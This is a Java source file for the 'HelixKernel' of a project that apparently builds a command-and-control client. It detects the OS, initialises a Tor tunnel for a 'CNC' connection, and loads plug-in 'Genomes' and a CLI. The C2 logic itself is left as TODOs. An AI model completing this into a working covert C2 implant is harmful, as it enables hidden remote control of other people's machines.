package helix.system;

import helix.entryPoint.GenomeLoader;
import helix.exceptions.OnionGeneralFailure;
import helix.exceptions.OnionSetupFailure;
import helix.exceptions.UnsupportedPlatform;
import helix.network.tor.OnionManager;
import helix.system.cli.HelixCli;

import java.util.Arrays;

public class HelixKernel
{

    private static HelixCli helixCli;

    /**
     * Returns the normalized platform OS name
     * @return The normalized name of the OS
     * **/
    public static OSName getNormalizedSystemName()
    {
        String name = System.getProperty("os.name").toUpperCase();

        if(name.contains("NIX") || name.contains("NUX") || name.contains("AIX"))
        {
            return OSName.UNIX;
        }
        else if(name.contains("WIN"))
        {
            return OSName.WINDOWS;
        }
        else if(name.contains("MAC"))
        {
            return OSName.MAC;
        }
        /* if(name.contains("SUNOS")) // Don't support solaris for now
        {
            return OSName.SOLARIS;
        }*/
        else
        {
            return OSName.UNKNOWN;
        }
    }

    /**
     * Bootstraps the Helix kernel.
     * Initializes a secure CNC tunnel through Tor, loads Genomes, sets up Helix CLI,
     * starts Genome watchdogs (if configured).
     * @param args Command line arguments
     * @return TRUE if kernel bootstrap succeeds, otherwise FALSE
     * **/
    public static boolean bootstrap(String[] args)
    {
        Arrays.sort(args);

        // TODO: Chose correct tunneling option (Tor, VPN, clearnet)
        try
        {
            OnionManager.init();
        }
        catch (OnionSetupFailure | OnionGeneralFailure onionSetupFailure)
        {
            onionSetupFailure.printStackTrace();
            // TODO: Check global config and handle accordingly (connect through clearnet?, wait for Tor to become available / next update?)
            return false;
        }
        catch (UnsupportedPlatform unsupportedPlatform)
        {
            // We're out of luck. This platform isn't supported
            return false;
        }

        // TODO: Init CNC tunnel

        // Load and start all installed Genomes
        GenomeLoader.loadInstalledGenomes();

        // Helix CLI
        if(Arrays.binarySearch(args, "--cli") >= 0)
        {
            helixCli = new HelixCli();
            helixCli.start();
        }

        // TODO: Start Genome watchdogs if configured

        return true;
    }

    /**
     * Destroys the Helix Kernel.
     * Closes the CNC tunnel, unloads Genomes, stops development tools, stops Genome watchdogs
     * **/
    public static void destroy()
    {
        // TODO: Kill CNC connection

        GenomeLoader.unloadAllGenomes();

        helixCli.close();
        helixCli = null;

        // TODO: Stop Genome watchdogs
    }

    public enum OSName
    {
        UNIX, WINDOWS, MAC, SOLARIS, UNKNOWN
    }
}
